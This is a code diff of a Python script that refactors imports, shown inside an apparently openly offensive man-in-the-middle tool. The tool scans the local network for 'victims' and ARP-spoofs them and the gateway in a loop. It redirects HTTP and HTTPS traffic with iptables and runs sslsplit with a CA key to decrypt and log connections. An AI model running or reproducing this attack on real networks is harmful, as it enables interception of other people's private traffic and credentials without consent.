@@ -1,11 +1,11 @@
 import ipaddress
 import netifaces
-import scapy.all as scapy
-import threading
 import os
-import time
+import scapy.all as scapy
+from threading import Thread
+from time import sleep
+from shutil import rmtree
 from queue import Queue
-import shutil
 
 
 GATEWAY_IP = '10.6.0.254'
@@ -44,8 +44,7 @@ def get_victims() -> list:
             iface = ipaddress.IPv4Interface(f'{addr}/{mask}')
             network = ipaddress.ip_network(iface.network)
             for ip in network:
-                threads.append(threading.Thread(
-                    target=alive, args=[str(ip)]))
+                threads.append(Thread(target=alive, args=[str(ip)]))
     print(f'Available Devices')
     print(f'--------------------------------------------------')
     print('IP\t\tMAC')
@@ -71,7 +70,7 @@ def trick(victim_ips: str):
         for victim_ip in victim_ips:
             spoof(victim_ip, GATEWAY_IP)
             spoof(GATEWAY_IP, victim_ip)
-        time.sleep(10)
+        sleep(10)
 
 
 def sslsplit():
@@ -79,7 +78,7 @@ def sslsplit():
         'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
     os.system(
         'iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
-    shutil.rmtree(LOG_DIR, ignore_errors=True)
+    rmtree(LOG_DIR, ignore_errors=True)
     os.makedirs(LOG_DIR)
     os.system(
         f'sslsplit ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 -k ca.key -c ca.crt -l connection.log -S {LOG_DIR} > /dev/null 2>/dev/null')
